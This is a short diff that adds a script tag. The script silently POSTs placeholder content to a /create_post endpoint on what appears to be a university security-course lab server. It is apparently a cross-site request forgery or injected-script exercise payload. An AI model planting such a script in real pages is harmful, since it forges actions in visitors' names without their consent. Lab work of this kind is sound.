@@ -1,0 +1,10 @@
+<script>
+    let data = new FormData();
+    data.append("content", "[content]");
+    data.append("type", "[type]");
+
+    fetch("http://1f940ab5ce93aff9942913dead9e2fe9c12b2bdb7076be3c73ab6ba9d563.project.ssof.rnl.tecnico.ulisboa.pt/create_post", {
+        method: "POST",
+        body: data
+    });
+</script>
